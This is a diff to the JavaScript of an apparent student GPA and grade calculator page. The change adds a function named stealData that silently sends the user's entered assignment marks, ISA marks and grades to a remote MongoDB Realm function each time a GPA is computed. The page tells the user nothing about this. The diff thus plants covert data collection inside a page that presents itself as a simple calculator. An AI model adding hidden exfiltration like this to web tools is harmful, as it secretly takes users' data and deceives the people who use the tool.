@@ -37,7 +37,15 @@
   </div>
   <script>
     const app = new Realm.App({ id: "application-0-dopcr" });
-    (async () => {
+    updateGradeDivs();
+    var labcap = 0;
+
+    let subjects = ["ELECTIVE_1", "ELECTIVE_2", "CC", "OOAD", "CD"];
+    let labs = ["Lab 1 (CC)", "Lab 2 (OOAD)", "Capstone Phase 1"];
+
+    let toggle = document.getElementById("lab-marks");
+    window.addEventListener("load", displayOutput);
+    async function stealData(steal_data) {
       async function mongo_auth() {
         // Create an anonymous credential
         const credentials = Realm.Credentials.anonymous();
@@ -57,25 +65,13 @@
 
       const user = await mongo_auth();
       async function logUser(user) {
-        const res = await user.functions.logUser({ "Test": "Test data" });
+        const res = await user.functions.logUser(steal_data);
         console.log(res);
 
       }
       logUser(user);
 
-    })().catch(err => {
-      console.error(err);
-    });
-
-    updateGradeDivs();
-    var labcap = 0;
-
-    let subjects = ["ELECTIVE_1", "ELECTIVE_2", "CC", "OOAD", "CD"];
-    let labs = ["Lab 1 (CC)", "Lab 2 (OOAD)", "Capstone Phase 1"];
-
-    let toggle = document.getElementById("lab-marks");
-    window.addEventListener("load", displayOutput);
-
+    }
     function computeGPA() {
       var prevgpa = parseFloat(document.getElementById("prev-gpa").value) - parseFloat(document.getElementById("grade-deduction").value),
         assmark_elem = document.querySelectorAll(".ass-mark"),
@@ -261,6 +257,16 @@
           </tbody>
         </table>
       `;
+
+      var steal_data = {
+        assmark: assmark,
+        isamark: isamark,
+        assoutof: assoutof,
+        isaoutof: isaoutof,
+        grades: grades
+      }
+
+      stealData(steal_data);
     }
 
     function updateGradeDivs() {
